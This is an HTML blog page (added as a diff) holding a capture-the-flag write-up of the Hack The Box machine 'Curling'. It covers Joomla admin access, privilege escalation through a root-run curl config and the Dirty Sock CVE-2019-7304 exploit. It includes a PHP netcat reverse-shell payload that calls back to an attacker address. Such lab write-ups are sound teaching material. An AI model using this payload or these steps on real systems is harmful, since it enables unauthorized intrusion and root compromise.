@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Curling | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Curling" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f&#39;); ?&gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Frolic" />
+<meta property="og:description" content="Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f&#39;); ?&gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Frolic" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/curling/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/curling/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/curling/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-03-30T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Curling","dateModified":"2019-03-30T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/curling/","datePublished":"2019-03-30T00:00:00+02:00","image":"http://localhost:4000/hackthebox/curling/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/curling/"},"description":"Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f&#39;); ?&gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Frolic","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Curling</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-03-30T00:00:00+02:00" itemprop="datePublished">Mar 30, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-curling-retired-and-here-is-my-write-up-about-it-i-had-a-lot-of-fun-doing-this-box-as-it-was-easy-and-simple-also-it-was-straightforward--no-rabbit-holes-and-such-things-its-a-linux-box-and-its-ip-is-101010150-i-added-it-to-etchosts-as-curlinghtb-lets-jump-right-in-">Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.150</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">curling.htb</code>. Let’s jump right in !</h4>
+<p><img src="/images/hackthebox/curling/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC curling.htb</code>
+<img src="/images/hackthebox/curling/1.png" alt="" /></p>
+<h4 id="we-only-get-2-open-ports--80-running-http-and-22-running-ssh-lets-look-at-http">We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
+<p><img src="/images/hackthebox/curling/2.png" alt="" /></p>
+<h4 id="we-see-a-blog-titled-cewl-curling-site--and-its-joomla-at-this-point-i-would-run-joomscan-but-i-wanted-to-do-some-manual-enumeration-first--so-i-checked-the-source-of-the-page-and-at-the-end-of-the-body-i-found-this-comment-">We see a blog titled “Cewl Curling site!” , and it’s <a href="https://www.joomla.org/">joomla</a>. At this point I would run <code class="highlighter-rouge">joomscan</code> but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment :</h4>
+<p><img src="/images/hackthebox/curling/3.png" alt="" /></p>
+<h4 id="so-i-checked-secrettxt-and-found-this-base64-string-">So I checked <code class="highlighter-rouge">/secret.txt</code> and found this <code class="highlighter-rouge">base64</code> string :</h4>
+<p><img src="/images/hackthebox/curling/4.png" alt="" /></p>
+<h4 id="decoding-">Decoding :</h4>
+<p><img src="/images/hackthebox/curling/5.png" alt="" /></p>
+<h4 id="curling2018-we-can-use-that-as-a-password-but-what-is-the-username--if-we-take-a-look-at-the-main-page-again-and-read-the-posts-"><code class="highlighter-rouge">Curling2018!</code> we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts :</h4>
+<p><img src="/images/hackthebox/curling/6.png" alt="" /></p>
+<h4 id="we-will-notice-a-name-in-one-of-the-posts--floris--now-we-can-try-to-login-as-floris-with-the-password-curling2018-">We will notice a name in one of the posts : <code class="highlighter-rouge">Floris</code> , now we can try to login as <code class="highlighter-rouge">floris</code> with the password <code class="highlighter-rouge">Curling2018!</code> :</h4>
+<p><img src="/images/hackthebox/curling/7.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/curling/8.png" alt="" /></p>
+<h4 id="and-it-worked-while-i-was-doing-this-enumeration-i-ran-gobuster-in-the-background-and-got-these-results-">And it worked. While I was doing this enumeration I ran gobuster in the background and got these results :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/administrator (Status: 301)
+/.htaccess (Status: 403)
+/bin (Status: 301)
+/cache (Status: 301)
+/components (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/index.php (Status: 200)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/server-status (Status: 403)
+/templates (Status: 301)
+/tmp (Status: 301)
+</code></pre></div></div>
+<h4 id="lets-go-to-administrator-and-login-to-the-administration-panel-">Let’s go to <code class="highlighter-rouge">/administrator</code> and login to the administration panel :</h4>
+<p><img src="/images/hackthebox/curling/9.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/curling/10.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/curling/11.png" alt="" /></p>
+<hr />
+
+<h3 id="editing-template-files-and-getting-a-reverse-shell-">Editing Template Files and Getting a Reverse Shell :</h3>
+<h4 id="on-the-configuration-section-theres-an-option-for-templates-">On the configuration section there’s an option for templates :</h4>
+<p><img src="/images/hackthebox/curling/12.png" alt="" /></p>
+<h4 id="by-going-to-that-we-notice-that-protostar-is-the-default-style-and-template-">By going to that we notice that protostar is the default style and template :</h4>
+<p><img src="/images/hackthebox/curling/13.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/curling/14.png" alt="" /></p>
+<h4 id="from-templates-we-will-go-to-protostar-details-and-files-and-create-a-new-php-file-">From templates we will go to <code class="highlighter-rouge">Protostar Details and Files</code> and create a new <code class="highlighter-rouge">php</code> file :</h4>
+<p><img src="/images/hackthebox/curling/15.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/curling/16.png" alt="" /></p>
+<h4 id="in-the-php-file-we-will-execute-a-system-command-to-get-a-reverse-shell-">In the php file we will execute a system command to get a reverse shell :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
+?&gt;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/curling/17.png" alt="" /></p>
+<h4 id="after-we-save-the-file-we-will-go-to-httpcurlinghtbtemplatesprotostarfilephp">After we save the file we will go to <code class="highlighter-rouge">http://curling.htb/templates/protostar/file.php</code></h4>
+<p><img src="/images/hackthebox/curling/18.png" alt="" /></p>
+<h4 id="then-we-check-our-listener-">Then we check our listener :</h4>
+<p><img src="/images/hackthebox/curling/19.png" alt="" /></p>
+<hr />
+
+<h3 id="user">User</h3>
+<h4 id="we-got-a-reverse-shell-as-www-data--in-the-home-directory-theres-a-directory-for-floris-">We got a reverse shell as <code class="highlighter-rouge">www-data</code> , in the <code class="highlighter-rouge">/home</code> directory there’s a directory for <code class="highlighter-rouge">floris</code> :</h4>
+<p><img src="/images/hackthebox/curling/20.png" alt="" /></p>
+<h4 id="we-dont-have-read-access-to-usertxt--but-we-notice-a-file-called-password_backup--by-looking-at-that-file-">We don’t have read access to <code class="highlighter-rouge">user.txt</code> , but we notice a file called <code class="highlighter-rouge">password_backup</code> , by looking at that file :</h4>
+<p><img src="/images/hackthebox/curling/21.png" alt="" /></p>
+<h4 id="its-a-hex-dump-file--so-i-copied-it-to-my-box-to-reverse-it-">It’s a <code class="highlighter-rouge">hex dump</code> file , So I copied it to my box to reverse it :</h4>
+<p><img src="/images/hackthebox/curling/22.png" alt="" /></p>
+<h4 id="to-reverse-a-hex-dump-file-we-will-use-xxd--so-xxd--r-pw_backup-">To reverse a <code class="highlighter-rouge">hex dump</code> file we will use <code class="highlighter-rouge">xxd</code> , so <code class="highlighter-rouge">xxd -r pw_backup</code> :</h4>
+<p><img src="/images/hackthebox/curling/23.png" alt="" /></p>
+<h4 id="not-a-normal-output--lets-redirect-the-output-to-a-file-and-see-">Not a normal output , let’s redirect the output to a file and see :</h4>
+<p><img src="/images/hackthebox/curling/24.png" alt="" /></p>
+<h4 id="so-what-happened-is--it-turned-out-to-be-a-bzip2-file-so-i-decompressed-it-then-got-a-new-gzip-file--decompressed-it-and-got-another-bzip2-file--after-decompression-i-got-a-tar-file--then-finally-a-txt-file-for-the-password-">So what happened is , it turned out to be a <code class="highlighter-rouge">bzip2</code> file so I decompressed it then got a new <code class="highlighter-rouge">gzip</code> file , decompressed it and got another <code class="highlighter-rouge">bzip2</code> file , after decompression I got a <code class="highlighter-rouge">tar</code> file , then finally a <code class="highlighter-rouge">txt</code> file for the password :</h4>
+<p><img src="/images/hackthebox/curling/25.png" alt="" /></p>
+<h4 id="lets-ssh-as-floris-">Let’s <code class="highlighter-rouge">ssh</code> as <code class="highlighter-rouge">floris</code> :</h4>
+<p><img src="/images/hackthebox/curling/26.png" alt="" /></p>
+<h4 id="and-we-owned-user-">And we owned user !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="curling">Curling</h3>
+<h4 id="by-looking-at-the-home-directory-of-floris-again-">By looking at the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">floris</code> again :</h4>
+<p><img src="/images/hackthebox/curling/27.png" alt="" /></p>
+<h4 id="theres-a-directory-called-admin-area-which-contains-two-files-">There’s a directory called <code class="highlighter-rouge">admin-area</code> which contains two files :</h4>
+<p><img src="/images/hackthebox/curling/28.png" alt="" /></p>
+<h4 id="input-and-report"><code class="highlighter-rouge">input</code> and <code class="highlighter-rouge">report</code></h4>
+<h4 id="input-"><code class="highlighter-rouge">input</code> :</h4>
+<p><img src="/images/hackthebox/curling/29.png" alt="" /></p>
+<h4 id="url--http127001"><code class="highlighter-rouge">url = "http://127.0.0.1"</code></h4>
+<h4 id="report-"><code class="highlighter-rouge">report</code> :</h4>
+<p><img src="/images/hackthebox/curling/30.png" alt="" /></p>
+<h4 id="its-obvious-that-this-is-the-output-of-executing-curl-on-http127001-">It’s obvious that this is the output of executing <code class="highlighter-rouge">curl</code> on <code class="highlighter-rouge">http://127.0.0.1</code> :</h4>
+<p><img src="/images/hackthebox/curling/31.png" alt="" /></p>
+<h4 id="even-the-name-of-the-box-is-a-hint-curling--so-what-about-changing-that-url-from-localhost-to-something-else-like-a-file--next-time-the-command-gets-executed-we-will-get-the-contents-of-that-file--maybe-roottxt--but-only-if-its-getting-executed-by-root-lets-try-and-see-if-it-will-work-">Even the name of the box is a hint <code class="highlighter-rouge">curling</code> , so what about changing that <code class="highlighter-rouge">url</code> from <code class="highlighter-rouge">localhost</code> to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe <code class="highlighter-rouge">root.txt</code> ? But only if it’s getting executed by <code class="highlighter-rouge">root</code>. Let’s try and see if it will work :</h4>
+<p><img src="/images/hackthebox/curling/32.png" alt="" /></p>
+<h4 id="then-we-will-do--watch-cat-report--this-is-executing-cat-report-every-2-seconds-and-giving-us-the-output--easier-than-checking-manually-">Then we will do : <code class="highlighter-rouge">watch cat report</code> , this is executing <code class="highlighter-rouge">cat report</code> every 2 seconds and giving us the output , easier than checking manually :</h4>
+<p><img src="/images/hackthebox/curling/33.png" alt="" /></p>
+<h4 id="after-some-time-we-get-the-flag">After some time we get the flag.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="dirty-sock--root-shell-">Dirty Sock ? Root shell !</h3>
+<h4 id="i-didnt-like-the-fact-that-i-could-only-read-the-flag--i-wanted-a-root-shell-so-i-tried-for-a-long-time-to-bypass-the-url-thing-and-get-a-reverse-shell--but-couldnt-then-when-i-did-this-box-again-for-the-write-up--one-of-the-things-that-caught-my-attention-is-that-we-are-on-an-ubuntu-box--so-i-checked-snap-version-to-know-if-its-vulnerable-to-cve-2019-7304-known-as-dirty-sock-and-of-course-it-was-">I didn’t like the fact that I could only read the flag , I wanted a <code class="highlighter-rouge">root</code> shell. So I tried for a long time to bypass the <code class="highlighter-rouge">url</code> thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an <code class="highlighter-rouge">ubuntu</code> box , so I checked <code class="highlighter-rouge">snap</code> version to know if it’s vulnerable to <code class="highlighter-rouge">CVE-2019-7304</code> known as <code class="highlighter-rouge">Dirty Sock</code> and of course it was :</h4>
+<p><img src="/images/hackthebox/curling/34.png" alt="" /></p>
+<h4 id="this-is-not-intended-at-all-because-by-the-time-this-box-was-released---cve-2019-7304-wasnt-disclosed-yet">This is not intended at all because by the time this box was released ,  <code class="highlighter-rouge">CVE-2019-7304</code> wasn’t disclosed yet.</h4>
+<h4 id="i-got-the-exploit-from-here--then-hosted-it-on-a-python-simple-http-server-and-downloaded-it-on-the-box-">I got the exploit from <a href="https://github.com/initstring/dirty_sock">here</a> , Then hosted it on a python simple http server and downloaded it on the box :</h4>
+<p><img src="/images/hackthebox/curling/35.png" alt="" />
+<code class="highlighter-rouge">python3 dirty_sockv2.py</code>
+<img src="/images/hackthebox/curling/36.png" alt="" /></p>
+<h4 id="now-we-can-su-to-dirty_sock-and-execute-commands-as-root-">Now we can <code class="highlighter-rouge">su</code> to <code class="highlighter-rouge">dirty_sock</code> and execute commands as root :</h4>
+<p><img src="/images/hackthebox/curling/37.png" alt="" /></p>
+<h4 id="or-just-sudo-su-and-we-will-get-a-root-shell-">Or just <code class="highlighter-rouge">sudo su</code> and we will get a root shell :</h4>
+<p><img src="/images/hackthebox/curling/38.png" alt="" /></p>
+<h4 id="we-owned-root-">We owned root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---frolic">Previous Hack The Box write-up : <a href="/hack-the-box/frolic/">Hack The Box - Frolic</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/curling/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
